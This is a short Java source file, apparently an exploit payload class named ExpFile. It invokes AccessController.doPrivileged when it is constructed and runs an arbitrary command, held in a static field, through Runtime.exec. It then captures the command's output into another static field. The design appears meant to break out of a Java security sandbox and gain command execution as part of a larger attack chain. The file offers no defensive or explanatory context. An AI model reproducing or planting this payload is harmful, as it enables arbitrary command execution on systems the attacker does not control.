package redcreen;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.AccessController;
import java.security.PrivilegedAction;

public class ExpFile implements PrivilegedAction<Object> {
	public static String data;
	public static String cmdresult = "null";

	public ExpFile() {

		AccessController.doPrivileged(this);
		// AccessController.doPrivileged(new PrivilegedAction<Object>(){
		// public Object run() {
		// try {
		// Runtime.getRuntime().exec("java -version");
		// System.out.println("ok1");
		// } catch (IOException e) {
		// throw new RuntimeException(e);
		// }
		// return null;
		// }
		// });
	}

	public static String exec(String cmd) {
		Process process = null;
		try {
			process = Runtime.getRuntime().exec(cmd);
//			System.out.println("okok");
		} catch (IOException e) {
//			e.printStackTrace();
			throw new RuntimeException(e);
		}
		try {
			process.getOutputStream();//.close();
			process.getErrorStream();//.close();
			BufferedReader ir = new BufferedReader(new InputStreamReader(
					process.getInputStream()));
			StringBuffer sb = new StringBuffer();
			String line = null;
			while ((line = ir.readLine()) != null) {
				sb.append(line).append("\n");
			}
			process.waitFor();
			return sb.toString();
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}

	@Override
	public Object run() {
		cmdresult = exec(data);
		return null;
	}

}
